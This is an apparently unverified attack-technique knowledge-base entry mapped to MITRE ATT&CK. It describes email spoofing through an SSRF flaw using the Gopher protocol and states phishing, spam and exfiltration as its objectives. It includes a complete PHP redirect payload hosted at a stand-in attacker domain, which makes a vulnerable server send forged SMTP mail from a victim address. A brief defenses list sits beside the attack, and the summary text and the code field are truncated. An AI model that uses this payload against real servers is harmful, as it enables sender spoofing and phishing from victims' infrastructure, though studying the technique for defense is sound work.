---
id: 8bfef3cf-722e-4857-bf4b-c354b9526870
name: Gopher SMTP Email Spoofing via SSRF
type: procedure
verified: false
submitted: false
created_at: '2023-04-06T03:56:37.974229+00:00'
updated_at: '2023-04-10T20:24:10.518988+00:00'
tactics:
- '[[Initial Access|TA0001 - Initial Access]]'
- '[[Persistence|TA0003 - Persistence]]'
- '[[Resource Development|TA0042 - Resource Development]]'
techniques:
- '[[Exploit Public-Facing Application|T1190 - Exploit Public-Facing Application]]'
- '[[External Remote Services|T1133 - External Remote Services]]'
- '[[Obtain Capabilities|T1588 - Obtain Capabilities]]'
tags:
- '[[Gopher]]'
- '[[Gopher SMTP - send a mail]]'
- '[[Server-Side Request Forgery]]'
- '[[SSRF exploitation via URL Scheme]]'
commands:
- '[[Create email payload and redirect victim to gopher protocol]]'
---

# Gopher SMTP Email Spoofing via SSRF

## Summary

Gopher SMTP Email Spoofing via SSRF is a technique used by attackers to send email messages from a victim's server using a Server-Side Request Forgery (SSRF) vulnerability. Attackers can exploit this vulnerability by sending a specially crafted request to the server, which will then send an email m

## Description

# Description

Gopher SMTP Email Spoofing via SSRF is a technique used by attackers to send email messages from a victim's server using a Server-Side Request Forgery (SSRF) vulnerability. Attackers can exploit this vulnerability by sending a specially crafted request to the server, which will then send an email message to the attacker's desired recipient. This technique can be used to send spam or phishing emails, or to exfiltrate sensitive information.

To execute this attack, an attacker must first identify a SSRF vulnerability in the victim's server. They can then use the Gopher protocol to craft a request that will send an email message via SMTP. The attacker can control the contents of the message, including the sender address, recipient address, and message body.

Businesses should be aware of the potential for SSRF vulnerabilities in their servers and take steps to mitigate them. This includes implementing input validation and sanitization, restricting network access, and monitoring server logs for suspicious activity.

 

## Requirements

1. Access to a server with a SSRF vulnerability

1. Knowledge of the Gopher protocol and SMTP

 

## Defense

1. Implement input validation and sanitization to prevent SSRF vulnerabilities

1. Restrict network access to limit the attack surface

1. Monitor server logs for suspicious activity

 

## Objectives

1. Send email messages from a victim's server

1. Conduct phishing or spam campaigns

1. Exfiltrate sensitive information

 

# Instructions

1. This command sends a spoofed email to a specified email address using the victim's email address as the sender. The email contains a specific message and subject.

 



**Code**: [[Content of evil.com/redirect.php:
<?php
        $c]]



> The commands array contains a list of SMTP commands that are used to send an email. The HELO command is used to identify the domain of the sender. The MAIL FROM command specifies the sender's email address. The RCPT TO command specifies the recipient's email address. The DATA command indicates the start of the email message. The Subject line specifies the email's subject. The message body is specified in the line 'Corben was here, woot woot!'. The final '.' command indicates the end of the email message. The payload is created by joining all the commands in the commands array with '%0A'. The header function is used to redirect the payload to the specified email server using the gopher protocol on port 25.



**Command** ([[Create email payload and redirect victim to gopher protocol]]):

```bash
<?php
        $commands = array(
                'HELO victim.com',
                'MAIL FROM: <admin@victim.com>',
                'RCPT To: <sxcurity@oou.us>',
                'DATA',
                'Subject: @sxcurity!',
                'Corben was here, woot woot!',
                '.'
        );

        $payload = implode('%0A', $commands);

        header('Location: gopher://0:25/_'.$payload);
?>
```



## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access|TA0001 - Initial Access]]
- [[Persistence|TA0003 - Persistence]]
- [[Resource Development|TA0042 - Resource Development]]

### Techniques

- [[Exploit Public-Facing Application|T1190 - Exploit Public-Facing Application]]
- [[External Remote Services|T1133 - External Remote Services]]
- [[Obtain Capabilities|T1588 - Obtain Capabilities]]

## Commands Used

- [[Create email payload and redirect victim to gopher protocol]]

## Tags

- [[Gopher]]
- [[Gopher SMTP - send a mail]]
- [[Server-Side Request Forgery]]
- [[SSRF exploitation via URL Scheme]]


